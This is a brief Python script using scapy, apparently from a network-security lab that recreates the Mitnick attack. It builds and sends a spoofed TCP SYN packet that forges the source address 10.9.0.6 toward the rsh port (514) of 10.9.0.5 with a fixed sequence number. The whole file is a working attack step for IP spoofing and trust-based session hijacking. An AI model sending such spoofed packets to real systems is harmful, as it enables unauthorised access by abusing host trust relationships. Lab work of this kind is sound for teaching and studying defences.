#!usr/bin/python3
from scapy.all import *
import sys

print("Sending spoofed SYN packet ....")
IpLayer = IP(src="10.9.0.6", dst="10.9.0.5")
TCPLayer = TCP(sport=1023,dport=514,flags="S",seq=778933536)
pkt = IpLayer/TCPLayer
send(pkt, verbose=0)
